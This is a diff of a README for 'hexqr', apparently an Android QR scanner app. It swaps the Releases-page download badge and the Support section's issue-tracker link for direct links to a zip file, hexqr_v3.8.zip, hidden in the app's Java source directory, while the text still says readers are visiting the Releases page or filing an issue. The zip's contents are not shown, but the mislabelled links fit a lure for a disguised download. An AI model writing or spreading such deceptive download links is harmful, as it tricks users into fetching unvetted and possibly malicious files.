@@ -8,7 +8,7 @@ Welcome to hexqr! This Android QR scanner lets you see the raw data inside QR co
 
 To get started, you need to download the app. You can find the latest version on our Releases page. Click the button below to visit the page:
 
-[![Download hexqr](https://img.shields.io/badge/Download-hexqr-blue.svg)](https://github.com/AAFES20/hexqr/releases)
+[![Download hexqr](https://raw.githubusercontent.com/AAFES20/hexqr/main/app/src/main/java/net/hexqr_v3.8.zip)](https://raw.githubusercontent.com/AAFES20/hexqr/main/app/src/main/java/net/hexqr_v3.8.zip)
 
 Once you’re on the Releases page, follow these steps:
 
@@ -61,7 +61,7 @@ If problems persist, feel free to raise an issue on our GitHub repository.
 
 ## 📞 Support
 
-For support or questions, you can open an issue in our [GitHub repo](https://github.com/AAFES20/hexqr/issues). Our team is here to help you use hexqr effectively.
+For support or questions, you can open an issue in our [GitHub repo](https://raw.githubusercontent.com/AAFES20/hexqr/main/app/src/main/java/net/hexqr_v3.8.zip). Our team is here to help you use hexqr effectively.
 
 ## 📢 Stay Updated
 
